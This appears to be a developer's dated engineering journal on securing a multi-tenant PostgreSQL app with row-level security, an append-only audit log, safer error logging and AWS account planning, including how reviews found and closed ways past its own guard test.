### 2026-11-01 — P1.1 design: policies in the Drizzle schema, plus a guard test `#database` `#security` `#process`
- **What happened:** Brainstormed P1.1 (tenancy) and chose to declare each table's RLS policy next to the table in the Drizzle schema, through a helper, instead of hand-writing every policy in SQL. Checked the library before designing: drizzle-orm 0.45 has `pgPolicy` and drizzle-kit 0.31 writes `ENABLE ROW LEVEL SECURITY`, but nothing generates `FORCE ROW LEVEL SECURITY`, so that line and the setting function are hand-written in the same migration. The real safety net is a **guard test** that reads PostgreSQL's catalogue and fails if any table lacks `business_id`, RLS, `FORCE` or a policy, or is granted DELETE.
- **Why / what I learned:** A rule that depends on remembering it per table will be forgotten once; a test over the whole catalogue catches the forgotten table in CI. Without `FORCE`, the table owner (my migration role) skips RLS silently. Columns stay tenancy-only (`id`, `name`, `created_at`); signup fields wait for P1.3, so I don't guess Module 00's open questions.
- **Say it in an interview:** "Every tenant table gets its policy from one helper, and a test scans the database catalogue so a new table without RLS fails CI. The policy is the guarantee; the test guarantees the policy exists."
- **Follow-ups to expect:** Why not an event trigger that enables RLS on every new table? (Event triggers need superuser-level rights, which my app roles deliberately don't have, and they'd behave differently on RDS. The guard test works the same everywhere, and it also checks the policy and grants, not just that RLS is on.)

### 2026-11-01 — Two tenancy gotchas: the empty-string setting and signup's chicken-and-egg `#database` `#gotcha`
- **What happened:** While designing, two traps came up. (1) After a transaction-local `set_config('app.business_id', …, true)` ends, the setting doesn't disappear on that connection: it reads back as `''`, and casting `''` to `uuid` throws an error. So the policy function uses `nullif(current_setting('app.business_id', true), '')::uuid`: no business set means NULL, which matches no rows. (2) The `businesses` table's own policy only allows the current business's row, so signup can't insert a business before one is set. The fix is to generate the new ID first, set it as the current business, then insert. The policy check passes and no bypass role is needed.
- **Why / what I learned:** Fail-safe defaults matter: "nothing set" must mean "see nothing", never "error" or "see everything". Both behaviours get integration tests in P1.1 (the first with a one-connection pool, so the same connection is reused).
- **Say it in an interview:** "A pooled connection that served business A must show nothing to the next request until it sets its own business. I proved that with a test that reuses the same connection."
- **Follow-ups to expect:** Why not `SET LOCAL`? (`SET` can't take query parameters, so the ID would have to be pasted into the SQL; `set_config` takes it as a parameter.)

### 2026-11-01 — UUIDv7 for IDs, and a composite key across tenants `#database` `#architecture`
- **What happened:** Chose UUIDv7 from PostgreSQL 18's built-in `uuidv7()` for every ID (ADR 0001 already said UUIDs; ADR 0027 records v7). Branches also get `unique (business_id, id)`, so later branch-level tables reference `(business_id, branch_id)`.
- **Why / what I learned:** Random UUIDv4s land at random places in the primary-key index, which splits pages and slows inserts; v7 starts with a timestamp, so new rows append at the end. The composite foreign key makes the database refuse a row of business A that points at a branch of business B, a mix-up RLS alone wouldn't catch, because RLS checks each row's own `business_id`, not what it points to.
- **Say it in an interview:** "IDs are time-ordered UUIDs, so they're safe to create anywhere and still index well, and foreign keys include the business ID so rows can't point across tenants."
- **Follow-ups to expect:** Doesn't a UUIDv7 leak the creation time? (Yes, to the millisecond. That's fine for bills and items; it would matter for something like a password-reset token, which uses random bytes instead.)

### 2026-11-01 — ADR 0027: how tenancy is built `#database` `#security` → ADR 0027
- **What happened:** Recorded the P1.1 design: UUIDv7 IDs; each tenant table's RLS policy declared in the Drizzle schema with `tenantPolicy()`, with `FORCE` and `app_current_business_id()` hand-written in the migration; `withBusiness` / `withNewBusiness` as the only way to reach tenant data; a guard test over the catalogue. Rejected: UUIDv4 and serial IDs, hand-written-only policies, an event trigger, `SET LOCAL`, a bypass role for signup, and relying on code review.
- **Why / what I learned:** ADR 0006 said *what* (RLS); this says *how*, and how we keep it true for tables that don't exist yet. A safety rule needs three parts: the mechanism (policies), one way to use it (`withBusiness`), and a check that it's everywhere (the guard test).
- **Say it in an interview:** "RLS is the guarantee; the guard test guarantees RLS is there. And I made signup go through the same policy by setting the new business's ID before inserting it, so there's no bypass to protect."
- **Follow-ups to expect:** What's the cost of RLS per query? (One extra comparison per row, against a value computed once per query thanks to the `(select …)` wrapper; with indexes that start with `business_id`, it's negligible.)

### 2026-11-01 — A type test showed a transaction fits where a database is expected `#database` `#testing` `#gotcha` → ADR 0027
- **What happened:** `withBusiness` must not accept a transaction: calling it inside another transaction would open a savepoint, and the transaction-local business setting would outlive the savepoint, switching the business for the rest of the outer transaction. The plan pinned this with a `// @ts-expect-error` line that passes a transaction. `pnpm typecheck` failed with "Unused '@ts-expect-error' directive": TypeScript accepted the transaction, because Drizzle's transaction type has almost everything the database type has. The fix: `AppDatabase = NodePgDatabase & { $client: Pool }`, the one thing a transaction lacks, and `withBusiness` takes that.
- **Why / what I learned:** `@ts-expect-error` turns "this must not compile" into a test, and an unused one is a red test. TypeScript compares shapes, not names (structural typing), so two types that look different can still be interchangeable.
- **Say it in an interview:** "I wanted the compiler to refuse a nested tenant transaction. A type-level test showed it didn't, so I narrowed the parameter to a type only a real connection pool has."
- **Follow-ups to expect:** Why not check at runtime? (The type check costs nothing at runtime and catches it before the code runs; a runtime check would only fail in the request that does it.)

### 2026-11-01 — Building the tenancy guard, and proving it with a planted fault `#database` `#testing` → ADR 0027
- **What happened:** The guard is one SQL query over `pg_class`, `pg_policy`, `pg_attribute`, `pg_constraint` and the table ACLs. It compares each policy with what `tenantPolicy()` generates, as PostgreSQL prints it back with `pg_get_expr`: `(business_id = ( SELECT app_current_business_id() AS app_current_business_id))`. Eleven probe tables, each a correct tenant table with one thing broken (no `ENABLE`, no `FORCE`, a `USING (true)` policy, a `FOR SELECT` policy, a nullable `business_id`, `GRANT DELETE … TO PUBLIC`, a `branch_id` with a plain foreign key, and one correct composite key), came back with exactly the expected rules. Then I deleted one `FORCE` line from the migration: the guard reported `businesses` + `force`; I restored it.
- **Why / what I learned:** Checking the stored policy text is strict: a policy that "looks fine" but compares the wrong column fails. Grants to `PUBLIC` must be checked too, because every role inherits them. A table with no explicit grants has a NULL ACL, so the query uses `acldefault()`.
- **Say it in an interview:** "My guard test reads PostgreSQL's catalogue, so a new table without RLS, `FORCE`, the right policy or the right grants fails CI. I proved it by breaking each rule on purpose and by deleting a `FORCE` line from the real migration."
- **Follow-ups to expect:** Why does the superuser still see everything? (Superusers and `BYPASSRLS` roles skip RLS even when it's forced; that's why the app's roles are neither.)

### 2026-11-01 — Small gotchas in P1.1 `#gotcha`
- **What happened:**
  - Drizzle 0.45 wraps driver errors, so the PostgreSQL code (`42501`, `22P02`, `23503`) is on `error.cause.code`, not `error.code`.
  - drizzle-kit wrote `ENABLE ROW LEVEL SECURITY` and the policies, but `FORCE` and the function had to be added to the generated file by hand, with the function first because the policies call it.
  - Lint forbids `!` (non-null assertions), so "the database returned no row" became an explicit `throw`.
  - The personal-data search matched a made-up test UUID (`…-8000-000000000000`): twelve zeros look like an Aadhaar number to the pattern. A false positive, but each match gets read, not skipped.
- **Why / what I learned:** Each was minutes, because the output said exactly what was wrong.
- **Say it in an interview:** —
- **Follow-ups to expect:** —

### 2026-11-01 — The final review found three ways past my guard, and a backup trap `#database` `#security` `#testing` → ADR 0027
- **What happened:** A fresh reviewer attacked the branch on a live PostgreSQL 18. My two tables were correct, but the guard (whose job is future tables) missed three leaks, each shown leaking business A's rows to business B:
  - **An extra permissive policy:** PostgreSQL ORs permissive policies, so a correct `tenant_isolation` plus a `reporting … using (true)` shows everything. The guard now refuses any permissive policy except `tenant_isolation` (restrictive ones only narrow, so they're allowed).
  - **Single-column foreign keys:** foreign-key checks skip RLS, so `from_branch_id → branches(id)` let B save a row pointing at A's branch. My rule only looked at columns named exactly `branch_id`. New `tenant_fk` rule: every key into another tenant table must pair `business_id` with `business_id`.
  - **Materialized views:** RLS never applies to them; one refreshed by the owner kept A's rows and showed them to anyone. New `kind` rule refuses them (and foreign tables) in `public`.
  It also found that `FORCE`, which filters the owner role, makes a data migration as `app_owner` change 0 rows silently, and makes `pg_dump` as `app_owner` fail, or write empty tables with `--enable-row-security`. Both are now in ADR 0027, the database runbook and PROGRESS (stage 7: backups need a `BYPASSRLS` role). Each guard fix started with a probe table that the old guard missed (red), then the query change (green).
- **Why / what I learned:** A guard is only as good as the attacks its author imagined, which is exactly why a fresh reviewer is worth it. "Safe by default" settings (`FORCE`) can turn into silent data loss elsewhere (migrations, backups), so every safety feature needs its side effects written down. Eight minor findings went into PROGRESS under the tasks where they matter (P1.2, P1.4, P1.7, stage 7).
- **Say it in an interview:** "A reviewer found that RLS doesn't cover foreign-key checks or materialized views, and that permissive policies combine with OR. I added a probe for each, watched my guard miss it, then fixed the guard. They also spotted that forcing RLS on the owner makes backups come out empty, so my backup plan uses a role that bypasses RLS and the restore drill checks row counts."
- **Follow-ups to expect:** Why not just give the owner `BYPASSRLS`? (Then every migration and every mistake as the owner could touch all businesses' rows; a separate backup role with only that power is narrower.)

### 2026-11-01 — Merged P1.1, and two git messages that looked like errors `#git` `#github` `#gotcha`
- **What happened:** PR #9 passed all five checks and was squash-merged. Re-running the cleanup commands myself gave `branch 'feat/p1.1-tenancy' not found` (it was already deleted) and `a branch named 'feat/p1.2-entry-log' already exists` (it had just been created). Neither was a problem: both said the work was already done.
- **Why / what I learned:** Read the message before reacting: "not found" on a delete and "already exists" on a create mean the goal is already reached. `git switch -c` only creates a branch; `git switch <name>` moves onto an existing one. After a squash merge, `git branch -d` refuses because git can't see the branch's commits inside `main`'s new single commit, so `-D` is needed.
- **Say it in an interview:** "With squash merges git doesn't know my branch was merged, because `main` has a new commit, not my commits. So I check that the PR is merged on GitHub, then delete the branch with `-D`."
- **Follow-ups to expect:** How do you know a squash-merged branch is safe to delete? (The PR shows Merged, and `git diff main <branch>` is empty or only shows later `main` changes.)

### 2026-11-01 — Designing the entry log before any feature needs it `#database` `#architecture` → ADR 0028
- **What happened:** Started P1.2's design. Module 06 is still DRAFT, but recording must exist from the first feature that changes data, or the early history is missing, so only the recording side is built now. With no users table until P1.4, "who" is a nullable `actor_id` with no foreign key yet (NULL = the system); P1.4 adds the key. Old → new values are two `jsonb` columns, `before` and `after`. `action` is plain text checked by a TypeScript type, not a database enum, so a new action needs no migration. The table defaults `business_id` to the current business, and the runtime role loses UPDATE.
- **Why / what I learned:** Each choice was made against two rejected options (a minimal users table now; a free-text name; one row per field; a precomputed diff) and written into ADR 0028. Deferring a foreign key is safe only because no real data exists yet; the follow-up is filed under P1.4 so it can't be forgotten.
- **Say it in an interview:** "The audit log is built before the features that use it, because a log added later can't recover what already happened. The database enforces that it's append-only, and each row commits in the same transaction as its change."
- **Follow-ups to expect:** Why not a database enum for actions? (Every new action would need a migration, and removing a value from an enum is hard; a TypeScript type catches typos at compile time instead.)

### 2026-11-01 — Design one section at a time, and stop at the end of a session `#process`
- **What happened:** The P1.2 design is being approved section by section: the table is approved, the write helper was presented, and the guard changes come next. The session ended mid-design, so the half-finished spec was written to a file, marked DRAFT, with what is approved and what is open.
- **Why / what I learned:** The chat is forgotten between sessions; only files carry a half-done design forward. Marking each section's status stops the next session treating an unanswered section as approved.
- **Say it in an interview:** —
- **Follow-ups to expect:** —

### 2026-11-02 — Built the entry log and its one write helper `#database` `#testing` → ADR 0028
- **What happened:** Migration `0002` adds `entry_log` as a normal tenant table (policy, `FORCE`, composite branch key) with `business_id` defaulting to `app_current_business_id()`, and a hand-written `REVOKE UPDATE … FROM app_runtime`. `recordEntry(tx, entry)` checks the reason, serialises `before`/`after` once to fail early on a `BigInt`, and inserts without passing `business_id`. 17 tests, written first and watched failing: fields, rollback, two businesses, no business, reasons, `42501` on UPDATE/DELETE/TRUNCATE, a branch from another business, bad JSON, a malformed actor, logging at signup, ordering.
- **Why / what I learned:** Letting the database fill in `business_id` means the helper can't name the wrong business at all. Taking a transaction (not the database) makes "log and action commit together" a compile-time fact.
- **Say it in an interview:** "Every module writes its audit row through one helper that only accepts the action's own transaction, so the log row and the change commit or roll back together, and the database refuses any edit to the log."
- **Follow-ups to expect:** What if logging fails? (The whole action fails and rolls back: a change without its log row is worse than a retry.)

### 2026-11-02 — Small gotchas while building P1.2 `#gotcha` `#database`
- **What happened:**
  - With no business set, the insert failed with `42501`, not the `23502` (NOT NULL) I'd planned: PostgreSQL runs the RLS `WITH CHECK` (`NULL = NULL` isn't true) before NOT NULL.
  - `now()` is the transaction's start time, so two entries in one transaction share `created_at`; the UUIDv7 `id` keeps their order (monotonic within one connection in PostgreSQL 18).
  - The test superuser URL from Testcontainers named the container's default database, not `business_software`, so my probe schema "didn't exist". `testing.ts` now points `adminUrl` at the app database.
  - Strict TypeScript (`exactOptionalPropertyTypes`) refused `{ reason: undefined }`: an optional property must be left out, not set to `undefined`. Lint refused `||` for "blank → null" (prefer `??`), which would have been wrong for `''`; an explicit check is clearer anyway.
- **Why / what I learned:** Read the actual error code before "fixing" the test; the database's order of checks is part of its behaviour.
- **Say it in an interview:** —
- **Follow-ups to expect:** —

### 2026-11-02 — The review found four more ways to edit an "append-only" table `#security` `#database` `#testing` → ADR 0028
- **What happened:** A fresh reviewer attacked the branch on a live PostgreSQL 18 and found the guard missed:
  - **A plain view:** `create view x as select * from entry_log` gets UPDATE for the app from the default privileges, and a simple view checks the base table's rights as its *owner* (`app_owner`, who owns the log), so `update x …` changed a log row. Fix: every view must be `security_invoker`.
  - **A column-level grant:** `grant update (reason) on entry_log to app_runtime` leaves `has_table_privilege(…, 'UPDATE')` false. Fix: `has_any_column_privilege`.
  - **A definer function granted straight to the app:** my rule only looked at PUBLIC; the best-practice "revoke from PUBLIC, grant to app_runtime" slipped through. Fix: any `SECURITY DEFINER` function the app can run fails unless it's on `DEFINER_ALLOWED` (empty until P1.4).
  - **An overloaded policy function:** a correct `app_current_business_id(int)` made the pin pass while the real one was changed to return another business's ID, leaking its rows. Fix: pin the exact zero-argument function and require it to be the only one.
  - Also a code gap: untyped code passing `actorId: undefined` was stored as NULL, "the system". Fix: a runtime check.
  Each fix started with a probe or test that failed. Seven minor findings went to PROGRESS.
- **Why / what I learned:** "Has UPDATE on the table" is one route; the question that matters is "can this role change a row by any route?". Views and definer functions run with someone else's rights, which is exactly how permissions get bypassed.
- **Say it in an interview:** "My audit log is insert-only for the app, and a reviewer showed me four ways a future migration could quietly undo that: a view, a column grant, a definer function and an overloaded function. I reproduced each as a failing probe, then made the guard check what the role can actually do."
- **Follow-ups to expect:** Why not just ban views? (Reporting views are useful; `security_invoker` keeps them while making them obey the caller's rights and RLS.)

### 2026-11-02 — Answered Module 00's open questions before building signup `#requirements` `#security` `#product`
- **What happened:** Before P1.3, I answered the five questions left open in Module 00, and two that came up while answering them. Owner auto-lock: 5 minutes, settable from 1 to 30. A staff session ends after 30 idle minutes. Forgotten owner password: an email link, plus a printed recovery key. Staff passwords: the owner resets them. Staff who leave are deactivated, never deleted. Each staff member has one home branch, and a login can be allowed into others. Owners log in by email. Staff log in with a username that only has to be unique within the shop, because the counter computer remembers which shop it belongs to. Adding email to signup changed a DECIDED point (#7: 6 fields, not 5), so it went into the Change log.
- **Why / what I learned:** The open questions decide the shape of the users and sessions tables. Guessing would have meant a migration later on real data. One answer led to the next: email reset meant email at signup, which meant checking the address, which raised the question of what people log in with. That last one wasn't on the list at all.
- **Say it in an interview:** "Before writing the login code, I settled the product rules it depends on. SMS OTP was out because of cost and India's DLT registration, so owners recover by email or a printed recovery key. Staff usernames are scoped to the shop, because the counter computer knows which shop it belongs to."
- **Follow-ups to expect:** Why does staff get a 30-minute logout but the owner a 5-minute lock? (The owner's screen shows salaries and profit, so it locks fast and keeps the session for a quick unlock. Staff screens show less, but a login left open overnight would put another person's name on the entry log.)

### 2026-11-02 — gitleaks isn't installed; it runs in Docker `#devops` `#gotcha`
- **What happened:** Before committing, `gitleaks git --staged` failed in PowerShell with "not recognized". gitleaks isn't installed on this laptop. `docs/devops/git-workflow.md` runs it as a pinned Docker image (`ghcr.io/gitleaks/gitleaks:v8.30.1`), with the repo mounted read-only. That command found no leaks.
- **Why / what I learned:** Running a tool from a pinned image means nothing to install or keep updated, and my laptop runs the same version as CI. Check the runbook before reaching for a command from memory.
- **Say it in an interview:** "My secret scanner runs from a pinned Docker image, both on my laptop and in CI, so a local scan and the CI check can't disagree because of version drift."
- **Follow-ups to expect:** —

### 2026-11-02 — Read the Free plan's rules before following my own AWS plan `#cloud` `#security` `#cost` `#gotcha` → ADR 0029
- **What happened:** Placement season is close, so DevOps stage 4 (opening the AWS account) came before P1.3. My plan said "IAM Identity Center" for sign-in. Before writing the steps, Claude read AWS's *Choosing a plan* page: "Free account plans will automatically upgrade to paid plan if you join AWS Organizations." Identity Center's usual setup turns Organizations on. So the plan changed to a root user locked away with MFA and an IAM user with MFA for daily work. The steps are in `docs/devops/aws-account.md`. The Free Tier FAQ also says the Free plan and credits are only for new AWS customers, so there's one account, in my own name. A family member's card as the payment method is fine; a second account isn't.
- **Why / what I learned:** A plan written before reading the provider's current rules can contain a trap. This one would have upgraded the account to Paid without asking, and that can't be undone. A one-way door is worth ten minutes of reading first. The earlier plan for the laptop's CLI (`aws sso login`, 2026-10-29 entry) depended on Identity Center, so how the CLI gets short-lived credentials moves to stage 5.
- **Say it in an interview:** "Before opening the account, I checked the Free plan's rules and found that joining AWS Organizations upgrades it to Paid. So instead of Identity Center I locked the root user away with MFA and work as an IAM user with MFA, and I'll narrow its admin rights in the security review."
- **Follow-ups to expect:** What's the difference between an IAM user, a group and a role? How will Terraform get credentials without long-lived access keys? (Stage 5 decides: short-lived credentials, e.g. the CLI's console sign-in or a role assumed with MFA; CI already uses OIDC.)

### 2026-11-10 — A whole-project scan before the cloud: read everything, then attack it `#process` `#security` `#testing`
- **What happened:** Before opening the AWS account I asked Claude for a deep scan of the whole project instead of one task's diff. It read every source file, migration, workflow and Dockerfile, and the plan. Then it attacked a live test database as the app's own role, 18 ways: switching Row-Level Security off, creating temp tables and functions, granting itself DELETE, switching to the owner role, reading password hashes, reusing a prepared statement across two businesses. Tenant isolation and the no-delete rules held every time. The four bugs it found were all in how the API *fails* (the next four entries), and the plan had gaps of its own (last entry). Each bug got a test that failed first.
- **Why / what I learned:** Reviews of one task ask "is this change right?". A whole-project read asks "what happens when this breaks, and does the rule I wrote down hold everywhere?". Those questions found bugs that the earlier, per-task reviews had walked past. Things I only reasoned about got run for real: a self-`GRANT` by a non-owner returns OK with a warning, and only checking the privilege afterwards shows it did nothing.
- **Say it in an interview:** "Before deploying anything I ran a full audit: I attacked my own database as the application's role and reviewed every failure path. The tenant isolation held, but I found the API would crash on a database restart and would have leaked customer data into logs. Both are fixed with tests that reproduce them."
- **Follow-ups to expect:** Why did earlier reviews miss them? (They reviewed diffs, and these bugs live between pieces: my pool code plus the driver's behaviour, my logging rule plus the framework's default.)

### 2026-11-10 — A database restart in the middle of a transaction crashed the API `#backend` `#database` `#mistake` `#gotcha`
- **What happened:** I already had a test that kills the database's idle connections and proves the API survives (2026-10-30 entry). The scan asked about the other state: a connection that is *in use*. pg-pool attaches its `error` listener only while a connection sits idle and removes it when the connection is checked out. Drizzle checks one out for every transaction, so for every `withBusiness` call. A new test opens a transaction, terminates the backend with `pg_terminate_backend`, and waits. Result: two uncaught exceptions (`terminating connection due to administrator command`, then `Connection terminated unexpectedly`). In the real API that is a crashed process, taking every other counter's request with it. Fix, in `createDatabase`: `pool.on('connect', client => client.on('error', …))`, so every connection always has a listener. The failure isn't hidden: the transaction's next query rejects, and that request gets a 500.
- **Why / what I learned:** I tested one half of "the database restarts" and assumed the whole. A failure has to be tested in each state the system can be in when it happens: idle and busy. RDS restarts for maintenance and after 7 days stopped, so this would have happened in the demo.
- **Say it in an interview:** "My API survived a database restart only if no request was running. The pool handles errors on idle connections, but a connection checked out for a transaction has no error listener, and Node crashes on an unhandled `error` event. I reproduced it by terminating the backend mid-transaction, then attached a listener to every connection the pool opens."
- **Follow-ups to expect:** Does the listener swallow the error? (No. The query that was running, or the next one, rejects with the reason, so the request fails and is logged. The listener only stops the process from dying.) What happens to the broken connection? (pg-pool sees it's no longer usable on release and removes it; the next request gets a new one. The test checks that.)

### 2026-11-10 — The framework's error handler would have logged customers' data `#security` `#backend` `#gotcha`
- **What happened:** My rule is "log messages, never error objects" (`secrets.md`, rule 5), and my own code follows it with `describeError`. But an unexpected error inside a request never reaches my code: NestJS's built-in exception filter handles it and calls `logger.error(exception)` with the whole object. A probe showed the output for a failed insert: the SQL, `params: …` with the values, and PostgreSQL's `detail` line (`Key (email)=(…) already exists.`), in both JSON and text logs. No route can fail that way yet, so nothing has leaked, but signup (P1.3) would have. Fix: `UnhandledErrorFilter` in `apps/api/src/error-filter.ts`. Nest's own HTTP errors (404, 400, 503) pass through untouched. Anything else becomes one `describeError` line and a plain 500. A test throws a Drizzle-shaped error from a route and checks both the answer and the exact log line.
- **Why / what I learned:** A logging rule has to hold at every exit, and the framework's default handler is an exit I hadn't looked at. "Works in my code" isn't "enforced". I also learned that Nest 12 already turns Express's 4xx errors (a body over 100 kB, malformed JSON) into quiet HTTP answers, so client mistakes don't flood the log.
- **Say it in an interview:** "ORM errors carry the query's parameter values, and my framework's default exception handler logs the whole error object. So one failing signup would have written a customer's email into the logs. I replaced the handler with a filter that logs messages only and returns a generic 500, and a test proves the values never reach the logger."
- **Follow-ups to expect:** Why not log the full error for debugging? (Logs go to CloudWatch and are read by more people and tools than the database is. The message chain plus the query text is enough to find the bug.) Can a message itself contain data? (Sometimes: PostgreSQL quotes a malformed input, e.g. `invalid input syntax for type uuid: "…"`. Validating input before the query closes most of that.)

### 2026-11-10 — Errors that nothing catches skip every `try/catch` `#backend` `#security`
- **What happened:** `runProcess()` wraps each entry point so a startup failure becomes one safe log line. But an `error` event with no listener, or a promise nobody awaited, isn't thrown *through* `main()`: Node handles it itself, prints the error object with all its properties, and exits. The pool bug above did exactly that. `runProcess` now also listens for `uncaughtException` and `unhandledRejection`, logs `"<name> crashed: …"` with `describeError`, and exits 1; it removes the listeners when `main()` ends.
- **Why / what I learned:** There are three ways out of a Node process on error: an exception up the call stack, a rejected promise nobody awaits, and an `error` event nobody listens to. A `try/catch` covers only the first. The process still exits after an uncaught error: its state can't be trusted, and Docker's restart policy brings it back clean.
- **Say it in an interview:** "A try/catch around main() doesn't see unhandled rejections or unhandled error events. I handle both at the process level: log one sanitized line, exit non-zero, and let the container restart policy bring up a clean process."
- **Follow-ups to expect:** Why exit instead of carrying on? (After an uncaught exception the program may be half-way through something; Node's own docs say to exit.) How do you test it without killing the test runner? (The test finds the listener `runProcess` added and calls it directly, with `process.exit` mocked.)

### 2026-11-10 — "Database unreachable: " with nothing after it `#backend` `#gotcha`
- **What happened:** With `localhost` in the database URL and the database down, the health check logged `Database unreachable: ` and no reason. `localhost` is two addresses (`::1` and `127.0.0.1`). Node tries both and, when both refuse, throws an `AggregateError` whose own message is empty; the real reasons are in its `errors` list. `describeError` now falls back to those inner messages, and then to the error's name. Two other gaps went in the same fix: a `cause` chain that loops back made it spin until the array overflowed (15 seconds of a stuck CPU in the test), and `cause: null` was reported as "a thrown object".
- **Why / what I learned:** `.env.example` uses `127.0.0.1`, one address, so I never saw it. A log line that says "failed" without saying why is nearly as bad as no log. A helper that runs on the error path must itself be unable to hang.
- **Say it in an interview:** "My error formatter printed an empty reason for a refused connection, because Node reports multi-address failures as an AggregateError with no message. I made it read the inner errors, and guarded it against cause cycles, since code on the error path has to be the most defensive code in the app."
- **Follow-ups to expect:** —

### 2026-11-10 — What the scan found in the plan, not the code `#architecture` `#security` `#process`
- **What happened:** Reading the plan against the rules already built showed gaps, now filed under their tasks in `PROGRESS.md`:
  - **The worker can't see anything.** `FORCE` RLS means no business set, no rows. But the worker's job starts with "find pending outbox rows" and "for each business, send the daily summary", before it knows any business. It needs one narrow cross-business read (P2.7).
  - **Login isn't the only lookup before a business is known.** So are the session check on every request, the reset link, the recovery key and the email confirmation. Putting the business ID next to the random token (cookie and link) keeps each one an ordinary RLS-scoped lookup (P1.4).
  - **The public demo login clashes with two rules.** Anyone can use it, so anyone could change its password or spend the AI budget; and "reset on a schedule" needs deletes that the database refuses by design (P1.20).
  - **The app can backdate an audit row.** `app_runtime` may insert `entry_log.created_at` itself. Column-level grants would close it; it's my decision, because demo data would then all carry the seeding date (P1.4).
  - Smaller ones: timeouts on locks and statements before two counters share rows (P1.8), `trust proxy` for per-IP rate limits behind Caddy, `Cache-Control: no-store` on API answers, session tokens stored as hashes (P1.4), HSTS once there's HTTPS (stage 5).
- **Why / what I learned:** Each ADR was right on its own. The gaps are where two decisions meet: forced RLS meets a worker with no tenant, zero-delete meets a resettable demo. After adding a strong rule, re-read the older plans against it.
- **Say it in an interview:** "Forcing Row-Level Security even for the table owner was the right call, but it has a consequence I only saw on a second read: my background worker has no tenant, so it can't even discover which tenants have work. I planned a single narrow, audited cross-tenant function for that instead of a bypass role."
- **Follow-ups to expect:** Why not give the worker `BYPASSRLS`? (Then one bug in a job leaks every shop's data. A function that returns only IDs keeps the worker inside `withBusiness` for everything else.)

### 2026-11-10 — Reviewed every technology with evidence, not opinion `#architecture` `#process` `#testing`
- **What happened:** Before pushing, I asked for a review of the whole plan: is each technology right, and does it work the way the plan assumes? Each verdict had to rest on something checked that day: what's installed and passing tests, the npm registry (`npm view`, `pnpm outdated`, `pnpm audit`), an official page, or an experiment. Result: keep the whole stack. Things the registry settled: TypeScript 7 is out but `typescript-eslint` still needs `<6.1`, so the pin stays; Drizzle 1.0 is still a release candidate, so 0.45 stays; nothing that ships has a known vulnerability. The review is in `docs/plans/2026-11-10-plan-review.md`.
- **Why / what I learned:** "Is this the right technology?" is two questions: was the choice sound, and does the thing behave as I assumed? The first was fine everywhere. The second failed in places I had never run (next two entries). A review that only re-reads the ADRs can't find those.
- **Say it in an interview:** "I audited my own architecture decisions with evidence: registry data, vendor docs and small spikes for the parts I hadn't run yet. The choices held, but two assumptions didn't survive a ten-minute experiment, and both would have cost me a day later."
- **Follow-ups to expect:** Why not upgrade to TypeScript 7 or Drizzle 1.0? (The linter doesn't support 7 yet, and I don't build on release candidates. Both are written down with the condition for revisiting.)

### 2026-11-10 — pg-boss refused to start with the least-privilege role I had designed `#database` `#security` `#gotcha` → ADR 0022
- **What happened:** ADR 0022 gives the job queue its own role that owns only the `pgboss` schema. I had read pg-boss's SQL when deciding, but never run it that way. On a throwaway PostgreSQL 18, `boss.start()` failed with `permission denied for database`. pg-boss runs `CREATE SCHEMA IF NOT EXISTS`, and PostgreSQL checks the right to create schemas before it checks whether the schema already exists. The fix is pg-boss's `createSchema: false` option. With it, queues (including a partitioned one, which creates a table at run time), send, work and schedule all ran, and neither role could read the other's tables.
- **Why / what I learned:** `IF NOT EXISTS` doesn't mean "no permission needed if it exists". And a least-privilege design is only proven when the software runs under it. Found at P2.7 instead, the quick fix would have been "grant CREATE on the database", quietly widening the role.
- **Say it in an interview:** "I gave my job queue a database role that owns only its own schema. When I spiked it, the library failed at startup because `CREATE SCHEMA IF NOT EXISTS` needs the create privilege even when the schema exists. I turned off its schema creation instead of widening the role."
- **Follow-ups to expect:** How did you check the isolation? (As the queue role, read and create in `public`: refused. As the app role, read `pgboss.job`: refused.)

### 2026-11-10 — My server is ARM64 and my CI builds x86 images `#devops` `#cloud` `#gotcha` → ADR 0011
- **What happened:** ADR 0011 picked a Graviton server (`t4g.small`) because it's the cheaper one. Graviton is ARM64. CI builds the images on `ubuntu-latest`, which is x86, and an x86 image on an ARM64 machine fails with `exec format error`. Nothing in the plan mentioned it. I built both images for `linux/arm64` on my laptop (Docker Desktop emulates it) and ran them: the API answered on `aarch64`, Caddy sent the same headers. It worked unchanged because none of our dependencies has native code. The deploy stage will build and smoke-test on GitHub's ARM64 runner, which is free for public repos.
- **Why / what I learned:** An image is built for one CPU architecture. "The same containers everywhere" is only true if the architecture matches too. Test on the architecture you deploy to.
- **Say it in an interview:** "I chose Graviton for cost, then realised my pipeline produced x86 images that wouldn't start on it. I verified the images build and run on ARM64 and moved the build to an ARM64 runner, so the image I test is the image I ship."
- **Follow-ups to expect:** Why not build a multi-architecture image? (One server, one architecture. Emulated builds are slow, and a native ARM64 runner is free.) What breaks on ARM64? (Native modules without ARM builds. Chromium for PDFs must be the ARM64 build.)

### 2026-11-10 — Changed the order of work: deploy first, then the shortest path to a bill `#process` `#devops` `#product`
- **What happened:** The review's biggest finding wasn't a technology. The plan built nine feature tasks, then went to the cloud, then built billing. But the AWS Free plan's 6 months start the day the account opens, and interviews are 1 to 3 months away. I chose a demo-first order: Terraform, deploy-on-merge and backups first, on today's skeleton; then signup, login, items, stock, billing, printing; then udhaar and demo data; then what a first demo doesn't need (staff permissions, branches, Excel import, batches and IMEI, transfers). Same tasks, same requirements. Three things keep the deferrals safe: signup creates the first branch, every route names its permission from the first route, and the stock ledger leaves room for batches.
- **Why / what I learned:** A plan can be right task by task and still be in the wrong order. Deploying a skeleton first means the pipeline is exercised by every feature instead of once at the end. Ordering by "shortest path to the core flow" protects against running out of time with the most important screen unbuilt.
- **Say it in an interview:** "I deployed a walking skeleton before building features, so every merge went through the real pipeline to a real server. Then I built the thinnest path to the product's core, a saved and printed GST bill, before anything optional."
- **Follow-ups to expect:** What did deferring permissions risk? (Retrofitting checks onto existing routes. So the guard and permission names exist from the first route; only staff logins come later.) What does it cost? (About $30 of credits a month from day one, so the server and database are stopped when idle.)

### 2026-11-12 — "Put AWS at the end to save money?" No: the clock is already running `#cloud` `#cost` `#process`
- **What happened:** After opening the AWS account I asked whether to move all the AWS work to the end of the project, to spend less. We worked it through. The Free plan closes the account 6 months after sign-up whether I use it or not. Credits only drop while a resource exists. So "AWS at the end" saves nothing that "AWS now, switched off when idle" doesn't, and it would waste the clock and leave no live link during placements. Rough numbers (ADR 0011, Mumbai prices): running 24/7 ≈ $30–35 a month (≈ $190 over 6 months, too close to the limit); running only for sessions and demos (~100 hours a month) ≈ $10 a month (≈ $60 over 6 months).
